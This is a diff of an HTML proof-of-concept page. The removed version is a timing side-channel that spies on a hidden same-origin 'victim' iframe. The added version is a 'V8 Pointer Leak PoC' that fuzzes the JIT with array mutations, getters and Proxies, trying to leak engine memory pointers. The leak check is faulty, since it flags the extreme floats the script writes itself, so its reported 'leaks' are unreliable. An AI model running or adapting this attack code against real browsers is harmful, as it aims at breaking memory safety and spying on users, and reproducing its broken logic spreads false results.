@@ -1,63 +1,99 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>Hybrid Oracle FINAL</title>
+<title>V8 Pointer Leak PoC - Ultra Strong</title>
 
-<h2>Hybrid Side-Channel (Stable)</h2>
+<h2>V8 Pointer Leak PoC - Ultra Strong (Read-Only)</h2>
 <pre id="log"></pre>
-
-<!-- IMPORTANT: same-origin path -->
-<iframe src="/spoof/victim.html" style="width:0;height:0;border:0"></iframe>
 
 <script>
 const log = m => {
-  document.getElementById('log').textContent += m + "\n"
-  console.log(m)
+    document.getElementById("log").textContent += m + "\n";
+    console.log(m);
+};
+
+// TARGET FUNCTION
+function vuln(a,i){ return a[i]+1.1; }
+
+// WARMUP
+function warmup(){
+    let arr = Array.from({length:50}, (_,i)=>i+0.5);
+    for(let j=0;j<200000;j++) vuln(arr,j%50);
+    return arr;
 }
 
-// ===== HYBRID PROBE =====
-function probe() {
-  const t0 = performance.now()
+// AGGRESSIVE MUTATION
+function mutate(arr){
+    for(let i=0;i<20;i++) delete arr[i]; // more holes
+    arr.length = 10;
+    arr[100] = 1.7976931348623157e+308; // extreme float
+    arr[2] = {x:1}; // force object kind
 
-  // CPU pressure
-  let x = 0
-  for (let i = 0; i < 5e6; i++) x += i
-
-  // GC-sensitive allocation
-  let arr = []
-  for (let i = 0; i < 15000; i++) arr.push([i])
-
-  return performance.now() - t0
+    Object.defineProperty(arr,3,{
+        get(){
+            arr.push(Math.random()*1e5);
+            return 1.1;
+        }
+    });
+    return arr;
 }
 
-// ===== CALIBRATION =====
-let baseline = 0
-
-function calibrate() {
-  let samples = []
-  for (let i = 0; i < 12; i++) {
-    samples.push(probe())
-  }
-
-  baseline = samples.reduce((a,b)=>a+b,0) / samples.length
-  log("Baseline = " + baseline.toFixed(2))
+// PROXY BREAK ASSUMPTION
+function breakAssumption(a){
+    return new Proxy(a,{
+        get(t,p){
+            if(p==="length"){
+                for(let i=0;i<20;i++) t.push(Math.random()*1e5);
+            }
+            if(typeof p==="string" && !isNaN(p) && Math.random()<0.7){
+                t.push(Math.random()*1e5);
+            }
+            return Reflect.get(t,p);
+        },
+        set(t,p,v){
+            if(Math.random()<0.3) t.length += 10;
+            return Reflect.set(t,p,v);
+        }
+    });
 }
 
-// tunggu sedikit biar iframe stabil
-setTimeout(() => {
-  calibrate()
+// LARGE TYPED ARRAY
+let buf = new ArrayBuffer(0x80000); // 512KB
+let f64 = new Float64Array(buf);
 
-  // ===== DETECTOR =====
-  setInterval(() => {
-    const t = probe()
-    const delta = t - baseline
+// INIT PATTERN
+for(let i=0;i<f64.length;i++) f64[i] = 0x41414141 + i;
 
-    let state = "IDLE"
-    if (delta > 6) state = "BUSY 🔥"
-    if (delta > 14) state = "HEAVY 💣"
+// CHECK POINTER-LEAK
+function checkTyped(){
+    for(let i=0;i<f64.length;i++){
+        let v = f64[i];
+        if(Math.abs(v) > 1e12){
+            log(`[POINTER-LEAK] idx=${i} val=${v}`);
+        }
+    }
+}
 
-    log(`t=${t.toFixed(2)} Δ=${delta.toFixed(2)} => ${state}`)
+// MAIN LOOP
+function run(){
+    log("[*] warmup / JIT");
+    let base = warmup();
 
-  }, 120)
+    log("[*] starting ultra aggressive pointer-leak fuzzing...");
+    for(let i=0;i<500000;i++){
+        let arr = [...base];
+        arr = mutate(arr);
+        arr = breakAssumption(arr);
 
-}, 1000)
+        vuln(arr,5);
+
+        // overlay extreme float to typed array
+        f64[i % f64.length] = 1.7976931348623157e+308;
+
+        if(i%1000===0) checkTyped();
+        if(i%500===0) log(`iter ${i}`);
+    }
+    log("[*] done - ultra pointer leak scan finished");
+}
+
+run();
 </script>
